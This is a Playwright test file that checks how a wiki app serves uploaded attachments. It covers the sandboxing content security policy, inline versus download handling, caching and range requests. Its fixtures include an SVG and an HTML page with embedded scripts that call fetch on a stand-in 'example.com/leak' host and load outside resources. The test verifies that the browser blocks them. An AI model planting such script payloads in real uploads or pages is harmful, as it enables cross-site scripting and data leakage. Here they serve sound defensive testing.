import { createHash } from "node:crypto";
import { readFileSync } from "node:fs";

import type { Request } from "@playwright/test";

import { download, oggOpus, pngBytes, uploadAsset, utf8, webmHead, type UploadFile } from "../../fixtures/assets";
import { createNotebook } from "../../fixtures/notebooks";
import { expect, test } from "../../fixtures/test";
import { newTeam } from "../../fixtures/workspaces";

// AS5, an attachment's content is served so that it cannot act as the site
// (M7 design 4.5; M7/P2 design 3.6): shown inline only for an image, an
// audio, a video or a PDF, downloaded otherwise, under its name; every
// answer sandboxed, cached privately until its address expires, readable
// by no other site. Only a browser proves what the sandbox stops: the page
// version opens the addresses themselves (v0.1 design 10.1's exception).

/** The policy of every content's answer. */
const contentPolicy = "sandbox; default-src 'none'; img-src 'self' data:; media-src 'self'; style-src 'unsafe-inline'";

/**
 * An SVG whose script would retitle it and call another site, were it run, and which would load an image and a style
 * sheet from another site.
 */
const svgBytes = utf8(
  `<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><title>drawing</title>` +
    `<style>@import url("https://example.com/leak.css");</style>` +
    `<script>document.title = "ran"; fetch("https://example.com/leak");</script>` +
    `<image href="https://example.com/leak.png" width="10" height="10"/>` +
    `<rect width="10" height="10" fill="red"/></svg>`
);

/** An HTML page whose script would do the same. */
const htmlBytes = utf8(
  `<!doctype html><title>page</title><script>document.title = "ran"; fetch("https://example.com/leak");</script>`
);

/** Each file, how it is served: its type, and whether a browser shows it, under the name the header gives. */
const files: { file: UploadFile; mime: string; inline: boolean; filename: string }[] = [
  {
    file: { name: "diagram.png", bytes: pngBytes },
    mime: "image/png",
    inline: true,
    filename: `filename="diagram.png"; filename*=UTF-8''diagram.png`,
  },
  {
    file: { name: "drawing.svg", bytes: svgBytes },
    mime: "image/svg+xml",
    inline: true,
    filename: `filename="drawing.svg"; filename*=UTF-8''drawing.svg`,
  },
  {
    file: { name: "paper.pdf", bytes: utf8("%PDF-1.4\n%%EOF\n") },
    mime: "application/pdf",
    inline: true,
    filename: `filename="paper.pdf"; filename*=UTF-8''paper.pdf`,
  },
  {
    file: { name: "sound.ogg", bytes: oggOpus(1) },
    mime: "audio/ogg",
    inline: true,
    filename: `filename="sound.ogg"; filename*=UTF-8''sound.ogg`,
  },
  {
    file: { name: "clip.webm", bytes: webmHead },
    mime: "video/webm",
    inline: true,
    filename: `filename="clip.webm"; filename*=UTF-8''clip.webm`,
  },
  {
    file: { name: "page.html", bytes: htmlBytes, type: "text/html" },
    mime: "application/octet-stream",
    inline: false,
    filename: `filename="page.html"; filename*=UTF-8''page.html`,
  },
  {
    file: { name: "图表 v2.txt", bytes: utf8("chart\n") },
    mime: "application/octet-stream",
    inline: false,
    filename: `filename="__ v2.txt"; filename*=UTF-8''%E5%9B%BE%E8%A1%A8%20v2.txt`,
  },
];

test("AS5 (API): each type's content is shown or downloaded under its name, sandboxed, cached privately until its address expires, for no other site; ranges and conditions are answered", async ({
  api,
  nervewiki,
}, testInfo) => {
  const { pat, workspace } = await newTeam(api, testInfo);
  const notebook = await createNotebook(api, pat, workspace.slug, "Plans");

  for (const { file, mime, inline, filename } of files) {
    // oxlint-disable-next-line no-await-in-loop -- one attachment at a time, each checked
    const asset = await uploadAsset(api, pat, notebook.id, file);
    const etag = `"${createHash("sha256").update(file.bytes).digest("hex")}"`;
    for (const [address, shown] of [
      [asset.content_url, inline],
      [asset.download_url, false],
    ] as const) {
      // oxlint-disable-next-line no-await-in-loop -- its two addresses
      const answer = await download(nervewiki.baseURL, address);
      expect(answer.status, `${file.name} at ${address}`).toBe(200);
      const headers = Object.fromEntries(answer.headers);
      const maxAge = Number(/^private, max-age=(\d+), immutable$/.exec(headers["cache-control"] ?? "")?.[1]);
      expect(
        {
          type: headers["content-type"],
          disposition: headers["content-disposition"],
          policy: headers["content-security-policy"],
          etag: headers.etag,
          corp: headers["cross-origin-resource-policy"],
          nosniff: headers["x-content-type-options"],
          frames: headers["x-frame-options"],
          referrer: headers["referrer-policy"],
          cachedAnHourOrTwo: maxAge > 3500 && maxAge <= 7200,
        },
        `${file.name} at ${address}`
      ).toEqual({
        type: mime,
        disposition: `${shown ? "inline" : "attachment"}; ${filename}`,
        policy: contentPolicy,
        etag,
        corp: "same-origin",
        nosniff: "nosniff",
        frames: "DENY",
        referrer: "same-origin",
        cachedAnHourOrTwo: true,
      });
      // oxlint-disable-next-line no-await-in-loop -- its body
      expect(Buffer.compare(Buffer.from(await answer.arrayBuffer()), Buffer.from(file.bytes))).toBe(0);
    }
    // oxlint-disable-next-line no-await-in-loop -- a range of it
    const range = await download(nervewiki.baseURL, asset.content_url, { Range: "bytes=0-3" });
    expect([range.status, range.headers.get("content-range")]).toEqual([206, `bytes 0-3/${file.bytes.length}`]);
    // oxlint-disable-next-line no-await-in-loop -- its body
    expect(Buffer.from(await range.arrayBuffer())).toEqual(Buffer.from(file.bytes.subarray(0, 4)));
    // oxlint-disable-next-line no-await-in-loop -- a read conditioned on what the client has
    const unchanged = await download(nervewiki.baseURL, asset.content_url, { "If-None-Match": etag });
    expect(unchanged.status).toBe(304);
  }
});

test("AS5 (page): an SVG opened at its address runs no script and loads nothing from another site; an HTML attachment is downloaded, not shown", async ({
  api,
  nervewiki,
  page,
  pageWatch,
}, testInfo) => {
  const { pat, workspace } = await newTeam(api, testInfo);
  const notebook = await createNotebook(api, pat, workspace.slug, "Plans");
  const svg = await uploadAsset(api, pat, notebook.id, { name: "drawing.svg", bytes: svgBytes });
  const html = await uploadAsset(api, pat, notebook.id, { name: "page.html", bytes: htmlBytes, type: "text/html" });
  // What came of each request to another site: Chromium reports one the
  // policy blocks as a request that failed, for "csp".
  const elsewhere = new Map<string, string>();
  const other = (request: Request) => new URL(request.url()).origin !== new URL(nervewiki.baseURL).origin;
  page.on("request", (request) => {
    if (other(request)) {
      elsewhere.set(request.url(), "sent");
    }
  });
  page.on("requestfailed", (request) => {
    if (other(request)) {
      elsewhere.set(request.url(), request.failure()?.errorText ?? "failed");
    }
  });
  page.on("response", (response) => {
    if (other(response.request())) {
      elsewhere.set(response.url(), `answered ${response.status()}`);
    }
  });
  // The other site is never reached: a request the policy let through is aborted here, and so told apart
  // ("net::ERR_FAILED") from one it blocked, which no route sees.
  await page.route("https://example.com/**", (route) => route.abort());

  const svgURL = new URL(svg.content_url, nervewiki.baseURL).toString();
  await page.goto(svgURL);
  await expect(page.locator("rect")).toBeAttached();
  expect(await page.title(), "the SVG's title, which its script would change").toBe("drawing");

  const htmlURL = new URL(html.content_url, nervewiki.baseURL).toString();
  const [downloaded] = await Promise.all([
    page.waitForEvent("download"),
    page.goto(htmlURL).catch(() => undefined), // a download is no navigation
  ]);
  expect(downloaded.suggestedFilename()).toBe("page.html");
  expect(readFileSync(await downloaded.path())).toEqual(Buffer.from(htmlBytes));
  expect(page.url(), "the page stays on the SVG").toBe(svgURL);
  await expect
    .poll(() => Object.fromEntries(elsewhere), { message: "the requests to another site, each blocked" })
    .toEqual({
      "https://example.com/leak.css": "csp",
      "https://example.com/leak.png": "csp",
    });

  // Chromium says the sandbox blocked the SVG's script, and the scripts the
  // watch puts in every document, once for each; and that the policy
  // refused the other site's image and style sheet: that alone.
  const blocked = `Blocked script execution in '${svgURL}' because the document's frame is sandboxed and the 'allow-scripts' permission is not set.`;
  const refused = [
    /^(Refused to load|Loading) the image 'https:\/\/example\.com\/leak\.png' (because it )?violates the following Content Security Policy directive: "img-src 'self' data:"/,
    /^(Refused to load|Loading) the stylesheet 'https:\/\/example\.com\/leak\.css' (because it )?violates the following Content Security Policy directive: "style-src 'unsafe-inline'"/,
  ];
  await expect
    .poll(() => refused.map((message) => pageWatch.consoleErrors.some((error) => message.test(error))), {
      message: "the policy's refusals",
    })
    .toEqual([true, true]);
  expect(pageWatch.consoleErrors, "the blocked scripts").toContain(blocked);
  const unknown = pageWatch.consoleErrors.filter(
    (error) => error !== blocked && !refused.some((message) => message.test(error))
  );
  expect(unknown, "other console errors").toEqual([]);
  pageWatch.expectConsole({ errors: [...pageWatch.consoleErrors] });
});
